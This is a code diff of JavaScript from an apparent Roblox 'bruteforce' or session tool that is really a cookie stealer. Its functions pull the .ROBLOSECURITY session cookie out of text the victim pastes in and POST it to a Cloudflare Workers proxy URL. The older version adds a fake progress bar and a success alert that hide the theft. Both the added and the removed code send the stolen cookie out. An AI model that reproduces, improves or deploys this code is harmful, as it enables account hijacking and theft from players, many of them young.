@@ -1,90 +1,41 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-// DOM Elements
-const usernameInput = document.getElementById('username');
-const sessionIdInput = document.getElementById('sessionId');
-const captchaCheckbox = document.getElementById('captcha');
-const errorDisplay = document.getElementById('error-message');
-const progressBar = document.getElementById('progress-bar');
-
-// ======================
-// Enhanced Cookie Extraction
-// ======================
-
-function extractRobloxSecurityCookie(rawInput) {
-  // Primary pattern for modern cookies
-  const fullCookiePattern = /(_\|WARNING:-DO-NOT-SHARE-THIS\.--[A-Za-z0-9+/=]{300,}_\|)/;
-  
-  // Secondary patterns for various formats
-  const backupPatterns = [
-    /(\.ROBLOSECURITY=[A-Za-z0-9_-]{300,})/,
-    /(ROBLOSECURITY=([^;]{300,}))/,
-    /("ROBLOSECURITY","([^"]{300,})")/
-  ];
-
-  // Try primary pattern first
-  const fullMatch = rawInput.match(fullCookiePattern);
-  if (fullMatch) return fullMatch[0];
-
-  // Try backup patterns
-  for (const pattern of backupPatterns) {
-    const match = rawInput.match(pattern);
-    if (match) return match[1] || match[0];
-  }
-
-  // Final fallback (with warning)
-  console.warn("Using raw input - may be incomplete");
-  return rawInput;
-}
-
-// ======================
-// Transmission Function
-// ======================
-
-async function sendToProxy(cookie) {
+async function sendToProxy(sessionId) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: cookie
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        sessionId: sessionId,
+        timestamp: new Date().toISOString()
+      })
     });
 
-    if (!response.ok) {
-      throw new Error(`Server responded with ${response.status}`);
-    }
-
-    return await response.text();
+    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    return await response.json();
+    
   } catch (error) {
-    console.error('Transmission failed:', error);
+    console.error('Proxy error:', error);
     throw error;
   }
 }
 
-
-
-
-
+// Example usage with your existing bruteforce function
 function bruteforce(sessionId) {
-  startProgressBar();
-  
-  setTimeout(async () => {
-    try {
-      const cookie = extractRobloxSecurityCookie(sessionId);
-      console.log("Extracted cookie length:", cookie.length);
-      
-      if (cookie.length < 300) {
-        throw new Error("Cookie appears truncated");
-      }
+  const cookie = sessionId.includes(".ROBLOSECURITY") 
+    ? extractRobloxSecurityCookie(sessionId)
+    : null;
 
-      await sendToProxy(cookie);
-      hideError();
-      alert("Processing completed successfully!");
-    } catch (error) {
-      showError("Failed to process session ID: " + error.message);
-    } finally {
-      progressBar.style.display = 'none';
-    }
-  }, 65000);
+  sendToProxy(cookie || sessionId)
+    .then(() => showCookieSuccess())
+    .catch(() => showError("Failed to send data"));
+}
+
+function extractRobloxSecurityCookie(sessionId) {
+  const match = sessionId.match(/\.ROBLOSECURITY[^=]+=([^;]+)/);
+  return match ? match[1] : null;
 }
 // Your existing validateInput function (unchanged)
 function validateInput() {
